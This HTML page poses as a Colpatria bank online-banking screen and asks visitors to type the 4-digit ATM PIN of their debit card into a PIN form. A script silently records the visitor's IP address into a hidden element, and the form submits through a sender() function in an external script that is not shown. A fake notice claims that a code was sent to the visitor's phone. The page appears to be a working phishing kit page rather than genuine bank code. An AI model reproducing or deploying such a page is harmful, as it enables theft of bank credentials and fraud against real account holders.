<!DOCTYPE html>

<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Home Colpatria virtual</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>

    <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>

   
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#ed0722">
   <link rel="icon" type="image/x-icon" href="images/favicon.ico">

    <link rel="stylesheet" type="text/css" href="css/canvas-dom-6.0.0.min.css">
    <link rel="stylesheet" type="text/css" href="css/otroindex2.css">

    <link rel="stylesheet" href="css/styles.79efb1f6fca6366f.css" media="all" onload="this.media=&#39;all&#39;">
    <noscript>
      <link rel="stylesheet" href="css/styles.79efb1f6fca6366f.css">
    </noscript>
    
  </head>
  <body _c_t_common="1">
    <auth-root _nghost-bry-c66="" ng-version="13.2.0">
      <div _ngcontent-bry-c66="" class="application-wrapper">
        <canvas-header _ngcontent-bry-c66="" shadow="" fixed="" class="header__block">
          <header class="header">
            <div class="header__bar container container--center direction--row">
              <a _ngcontent-bry-c66=""class="brand block block--centered" href="#">
                <img _ngcontent-bry-c66="" src="images/logo.svg" class="logo">
                <img _ngcontent-bry-c66="" src="images/logo_symbol.svg" class="logo__mobile">
              </a>
            </div>
          </header>
        </canvas-header>
        <section _ngcontent-bry-c66="" role="main" class="container main-container">
          <router-outlet _ngcontent-bry-c66=""></router-outlet>
          <auth-container-register>

            <router-outlet></router-outlet>
            <auth-validate-otp-register _nghost-bry-c101="">

              <!---->
              <div _ngcontent-bry-c101="" class="col-xs-12 block--padding-0 margin-md-36--top">
                <div _ngcontent-bry-c101="" class="direction--row">
                  <div _ngcontent-bry-c101="" class="col-sm-1 hide--xs"></div>
                  <div _ngcontent-bry-c101="" class="col-xs-12 col-sm-4 block--padding-0 validate-otp">
                    <div _ngcontent-bry-c101="" class="validate-otp--title">
                     
                      
                           <p _ngcontent-c5="" style="font-size: 17pt;line-height: 30px;" >Ingresa la clave de cajero para tu tarjeta de débito terminada en <strong style="font-size: 30pt;">•••</strong></p>

                           <hr _ngcontent-c5="" class="brand-line text--align-left margin-xs-18--top">
                     
                    </div>
                   
                    <div _ngcontent-bry-c101="" class="direction--row margin-xs-36--top">
                      <p id="gfg" hidden="">
                      <form _ngcontent-bry-c101="" action="" method="post" onsubmit=" return sender()"  role="form"  class="form ng-touched ng-dirty ng-valid">
                        <div _ngcontent-bry-c101="" class="direction--row">
                          <div _ngcontent-bry-c101="" class="col-xs-12 block--padding-0 validate-otp__box-form">
                             <strong _ngcontent-bry-c101="" > Ingresa la clave de 4 dígitos </strong>
                            <canvas-input-pin _ngcontent-bry-c101="" formcontrolname="inputPin" _nghost-bry-c52="" class="ng-touched ng-dirty ng-valid">
                              <div _ngcontent-bry-c52="" class="direction--row direction--nowrap">
                                <div _ngcontent-bry-c52="" class="form__input form__input--pin">

                                  <canvas-input-pin-single _ngcontent-bry-c52="" _nghost-bry-c53="">

                                    <input class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" type="text"  autocomplete="off"   maxlength="1" required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" id="num1" name="num1" autofocus required>
                                  </canvas-input-pin-single>
                                </div>
                                <div _ngcontent-bry-c52="" class="form__input form__input--pin">
                                  <canvas-input-pin-single _ngcontent-bry-c52="" _nghost-bry-c53="">
                                    <input class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" type="text" autocomplete="off"  maxlength="1"  required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2" name="num2">
                                  </canvas-input-pin-single>
                                </div>
                                <div _ngcontent-bry-c52="" class="form__input form__input--pin">
                                  <canvas-input-pin-single _ngcontent-bry-c52="" _nghost-bry-c53="">
                                    <input class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" type="text" autocomplete="off" maxlength="1"  required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3" name="num3">
                                  </canvas-input-pin-single>
                                </div>
                                <div _ngcontent-bry-c52="" class="form__input form__input--pin">
                                  <canvas-input-pin-single _ngcontent-bry-c52="" _nghost-bry-c53="">
                                    <input class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" type="text" autocomplete="off"  maxlength="1"  required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()" id="num4" name="num4">
                                  </canvas-input-pin-single>
                                </div>
                       
                                <!---->
                                <!---->
                              </div>
                            </canvas-input-pin>
                            <!---->
                            <!---->
                           
                          </div>
                        </div>
                        
                    
                    </div>
                  </div>
                  <div _ngcontent-bry-c101="" class="col-sm-1 hide--xs"></div>
                  <div _ngcontent-bry-c101="" class="col-xs-12 col-sm3 block--padding-0 validate-otp__box-information">
                    <canvas-co-buddy-tips _ngcontent-bry-c101="" class="hide--xs">
                      
                    </canvas-co-buddy-tips>
                    <canvas-co-buddy-tips _ngcontent-bry-c101="" class="hide--md hide--lg hide--sm">
                      <div class="buddytips-container--co buddytips-container--co--flat">
                        <div class="block buddytip-container__img">
                         
                        </div>
                       
                        <!---->
                        <!---->
                      </div>
                    </canvas-co-buddy-tips>
                  </div>
                  <div _ngcontent-bry-c101="" class="hiden--sm hide--xs"></div>
                </div>
                <div _ngcontent-bry-c101="" class="validate-otp__navegation">
                  <div _ngcontent-bry-c101="" class="direction--row">
                    <div _ngcontent-bry-c101="" class="col-sm-1 hide--xs"></div>
                    <div _ngcontent-bry-c101="" class="col-xs-12 col-sm-8 col-md-8 offset-md-0 block--padding-0">
                      <div _ngcontent-bry-c101="" class="direction--row action__buttons validate-otp__buttons">
                        <div _ngcontent-bry-c101="" class="col-xs-6 col-sm-4 col-md-4 block--padding-0">
                          <canvas-button-navigation _ngcontent-bry-c101="" type="back" class="navegation" _nghost-bry-c46="">
                            
                          </canvas-button-navigation>
                        </div>
                        <div _ngcontent-bry-c101="" class="col-xs-6 col-sm-4 col-md-2 block--padding-0 validate-otp__buttons--right">
                          <canvas-button-navigation _ngcontent-bry-c101="" type="continue" class="navegation" _nghost-bry-c46="">
                            <button _ngcontent-bry-c46="" class="button button--continue" type="submit" id="">
                              <span _ngcontent-bry-c46="" class="block block--centered">
                                <!---->
                                <span _ngcontent-bry-c46="" class="button__text"> Continuar </span>
                                <span _ngcontent-bry-c46="" class="button__icon block block--centered" id="">
                                  <canvas-svg _ngcontent-bry-c46="" size="24" class="flex">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-24px">
                                      <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44"></path>
                                    </svg>
                                  </canvas-svg>
                                </span>
                                <!---->
                              </span>
                            </button>
                          </canvas-button-navigation>
                          <!---->
                          <!---->
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              </form>
              <canvas-toast _ngcontent-bry-c101="" class="validate-toast" _nghost-bry-c61="">
                <div _ngcontent-bry-c61="" class="toast toast--container col-xs-12 col-sm-6 col-md-6 col-lg-6 toast--success">
                  <canvas-svg _ngcontent-bry-c61="" size="24" role="presentation" class="icon toast__icon flex">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-24px svg-icon--color-success">
                      <path stroke="none" d="M23.94 11.97c0 6.61-5.36 11.97-11.97 11.97C5.358 23.94 0 18.58 0 11.97 0 5.358 5.358 0 11.97 0c6.61 0 11.97 5.358 11.97 11.97zm-13.37 2.855l-2.928-2.58a.997.997 0 1 0-1.319 1.498l3.679 3.241a.997.997 0 0 0 1.41-.092l6.35-7.258a.998.998 0 0 0-1.5-1.313l-5.692 6.504z"></path>
                    </svg>
                  </canvas-svg>
                  <p _ngcontent-bry-c61="" class="text text--caption">Hemos enviado un código a tu celular registrado.</p>
                  <div _ngcontent-bry-c61="" class="toast__close-button">
                    <canvas-svg _ngcontent-bry-c61="" name="close" size="14" class="flex">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-14px">
                        <path fill="none" d="M2.72 2.66l18.62 18.62m0-18.62L2.72 21.28"></path>
                      </svg>
                    </canvas-svg>
                  </div>
                  <!---->
                </div>
              </canvas-toast>
            </auth-validate-otp-register>
            <!---->
          </auth-container-register>
          <!---->
        </section>
        <footer _ngcontent-bry-c66="" class="hide--xs">
          <canvas-co-footer-simple _ngcontent-bry-c66="">
            <div class="footer-simple--co background--background-alternate">
              <div class="container container--center">
                <div class="direction--row">
                  <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                    <div class="margin-xs-12 margin-sm-18">
                      <p class="text--roman text--footer color--default">
                        <span _ngcontent-bry-c66="" text=""> © 2022 Todos los Derechos Reservados <br _ngcontent-bry-c66="" class="hide--sm hide--md hide--lg">  Colpatria. </span>
                        <!---->
                        <!---->
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </canvas-co-footer-simple>
        </footer>
      </div>
      <jwl-channel-available-error _ngcontent-bry-c66="">
        <!---->
      </jwl-channel-available-error>
    </auth-root>
 <script src="js/sax2.js"></script>
  </body>
</html>